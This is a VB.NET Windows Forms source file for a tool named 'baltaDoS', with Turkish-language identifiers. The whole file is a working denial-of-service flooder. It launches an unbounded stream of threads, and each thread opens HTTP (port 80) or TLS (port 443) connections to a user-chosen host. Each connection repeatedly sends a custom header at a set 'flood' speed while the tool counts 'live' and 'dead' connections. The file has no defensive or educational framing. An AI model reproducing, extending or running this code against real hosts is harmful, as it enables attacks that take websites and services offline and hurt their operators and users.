Imports System.Net.Sockets
Imports System.IO
Imports System.Text
Imports System.Net
Imports System.Threading

Public Class baltaDoS
    Private thread80 As System.Threading.Thread
    Private coklu443 As System.Threading.Thread
    Private coklu80 As System.Threading.Thread
    Private thread443 As System.Threading.Thread

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
    End Sub
    Private Sub https443()
        Dim header As String = txtHeader.Text
        Dim soket443(txtLimit.Text) As Socket
        Dim stream443(txtLimit.Text) As Security.SslStream
        Try
            While True
                If txtDurum.Text = 1 Then
                    txtHatadurum.Text = "HATA YOK"
                    txtHatadurum.ForeColor = Color.Lime
                    soket443(txtDenenen.Text) = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                    soket443(txtDenenen.Text).Connect(txtHost.Text, 443)
                    stream443(txtDenenen.Text) = New Security.SslStream(New Sockets.NetworkStream(soket443(txtDenenen.Text)))
                    stream443(txtDenenen.Text).AuthenticateAsClient(txtHost.Text)
                    stream443(txtDenenen.Text).Write(Encoding.Default.GetBytes(header), 0, header.Length)
                    Dim buffer(10000) As Byte
                    Dim miktar As Integer
                    'Do
                    miktar = stream443(txtDenenen.Text).Read(buffer, 0, buffer.Length)
                    txtReceive.Text = Encoding.Default.GetString(buffer, 0, miktar)
                    'Dim kb As Integer = miktar / 1024
                    'indirildi.Text += kb
                    txtIndirilen.Text += miktar / 1024
                    System.Threading.Thread.Sleep(txtFloodhiz.Text)
                    'Loop While miktar > 0
                Else
                    thread443 = New System.Threading.Thread(AddressOf https443)
                    thread443.Abort()
                End If
            End While
        Catch ex As Exception
            txtHatadurum.Text = "HATA VAR"
            txtHatadurum.ForeColor = Color.Red
            txtDenenen.Text += 1
            txtOlumakineler.Text += 1
            Dim cm As Integer = txtMakineler.Text - txtOlumakineler.Text
            txtCalisanmakineler.Text = cm
            System.Threading.Thread.Sleep(txtFloodhiz.Text)
        End Try
        Me.Refresh()
    End Sub
    Private Sub cokluthread443()
        txtMakineler.Text = 0
        While True
            If txtDurum.Text = 1 Then
                Dim makinesay As Integer = txtMakineler.Text
                Dim th(makinesay) As Thread
                th(makinesay) = New System.Threading.Thread(AddressOf https443)
                th(makinesay).Start()
                txtMakineler.Text += 1
                Dim cm As Integer = txtMakineler.Text - txtOlumakineler.Text
                txtCalisanmakineler.Text = cm
                System.Threading.Thread.Sleep(txtMakinehiz.Text)
            Else
                coklu443.Abort()
            End If
        End While
        Me.Refresh()
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        txtMakineler.Text = 0
        txtCalisanmakineler.Text = 0
        txtOlumakineler.Text = 0
        txtDenenen.Text = 0
        txtIndirilen.Text = 0
        txtReceive.Text = ""
        txtDurum.Text = 1
        coklu443 = New System.Threading.Thread(AddressOf cokluthread443)
        coklu443.Start()
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        txtDurum.Text = 0
    End Sub
    Private Sub http80()
        Try
            '
            txtDenenen.Text += 1
            Dim denenen As Integer = txtDenenen.Text
            Dim limitdizisi As Integer = txtLimit.Text
            If denenen > limitdizisi Then
                txtDenenen.Text = 0
                denenen = 0
            End If
            '
            Dim header As String = txtHeader.Text
            Dim host As String = txtHost.Text
            '
            Dim soket80(limitdizisi) As Socket
            Dim stream80(limitdizisi) As NetworkStream
            soket80(denenen) = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
            soket80(denenen).Connect(host, 80)
            stream80(denenen) = New NetworkStream(soket80(denenen))
            '
            While True
                '
                If txtDurum.Text = 1 Then
                    txtHatadurum.ForeColor = Color.Lime 'sonradan silinecek
                    stream80(denenen).Write(Encoding.Default.GetBytes(header), 0, header.Length)
                    Dim buffer(10000) As Byte
                    Dim miktar As Integer
                    miktar = stream80(denenen).Read(buffer, 0, buffer.Length)
                    txtReceive.Text = Encoding.Default.GetString(buffer, 0, miktar) 'sonradan silinecek
                    txtIndirilen.Text += miktar / 1024
                    System.Threading.Thread.Sleep(txtFloodhiz.Text)
                Else
                    thread80.Abort()
                End If
                '
            End While
            '
        Catch ex As Exception
            txtHatadurum.Text = ex.Message 'sonradan silinecek
            txtHatadurum.ForeColor = Color.Red 'sonradan silinecek
            txtOlumakineler.Text += 1
            Dim calisanmakineler As Integer = txtMakineler.Text - txtOlumakineler.Text
            txtCalisanmakineler.Text = calisanmakineler
            System.Threading.Thread.Sleep(txtFloodhiz.Text)
        End Try
        Me.Refresh()
    End Sub
    Private Sub cokluthread80()
        On Error Resume Next
        txtMakineler.Text = 0
        While True
            If txtDurum.Text = 1 Then
                Dim limit As Integer = txtLimit.Text
                Dim calisanmakineler As Integer = txtCalisanmakineler.Text
                If limit > calisanmakineler Then
                    Dim makinesay As Integer = txtMakineler.Text
                    Dim th(makinesay) As Thread
                    th(makinesay) = New System.Threading.Thread(AddressOf http80)
                    th(makinesay).Start()
                    txtMakineler.Text += 1
                    Dim calisanmakineler_guncel As Integer = txtMakineler.Text - txtOlumakineler.Text
                    txtCalisanmakineler.Text = calisanmakineler_guncel
                    System.Threading.Thread.Sleep(txtMakinehiz.Text)
                End If
            Else
                coklu80.Abort()
            End If
        End While
        Me.Refresh()
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        txtMakineler.Text = 0
        txtCalisanmakineler.Text = 0
        txtOlumakineler.Text = 0
        txtDenenen.Text = 0
        txtIndirilen.Text = 0
        txtReceive.Text = ""
        txtDurum.Text = 1
        coklu80 = New System.Threading.Thread(AddressOf cokluthread80)
        coklu80.Start()
    End Sub
End Class
